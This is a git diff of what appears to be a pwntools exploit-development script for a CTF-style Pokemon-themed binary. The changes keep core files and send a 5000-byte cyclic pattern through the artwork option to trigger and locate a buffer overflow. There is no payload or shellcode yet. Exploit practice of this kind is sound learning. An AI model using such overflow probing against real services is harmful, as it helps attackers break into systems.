@@ -151,7 +151,7 @@ def inspect_core(io):
         log.info(f'The faulting address is {hex(core.fault_addr)}')
 
         # Delete the core file.
-        os.remove(core.path)
+        #os.remove(core.path)
     except:
         log.error('Failed to open core.')
 
@@ -170,14 +170,31 @@ def main():
 
         # Remove the third Pokemon from our party. I am not sure if the order is
         # important yet, but I have observed the segfault when we release the
-        # third Pokemon.
+        # third Pokemon. This will now be a Charizard.
         choose_an_option(io, Party.THIRD)
 
 
         # Change its artwork.
-        #choose_an_option(io, Choice.CHANGE_POKEMON_ARTWORK)
+        choose_an_option(io, Choice.CHANGE_POKEMON_ARTWORK)
+
+        # Choose the third pokemon (which is now a Charizard).
+        choose_an_option(io, Party.THIRD)
+
+        # It will accept up to ~4k bytes, so let's make a cyclic pattern that large.
+        io.sendline(cyclic(5000))
+        io.recvline()
+
+        # # Inspect our Pokemon. This should trigger the segfault.
+        # # For some reason I am currently unsure of, just sending one command
+        # # doesn't work. It seems to only work when they are grouped together
+        # # on the same line, at least two are needed. This sends '33'.
+        io.sendline(str(Choice.INSPECT_POKEMON.value) * 1)
+        # #io.close()
+        # io.recvline()
         io.interactive()
-        inspect_core(io)
+
+        # Inspect the core.
+        #inspect_core(io)
 
 
 if __name__ == '__main__':
